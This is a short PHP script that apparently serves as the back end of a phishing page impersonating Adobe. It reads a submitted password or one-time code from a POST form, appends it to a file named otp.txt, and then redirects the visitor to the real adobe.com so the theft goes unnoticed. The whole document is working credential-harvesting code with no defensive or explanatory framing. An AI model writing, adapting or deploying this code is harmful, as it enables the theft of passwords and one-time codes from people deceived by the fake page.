<?php
file_put_contents("otp.txt", "" .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.adobe.com/');
?>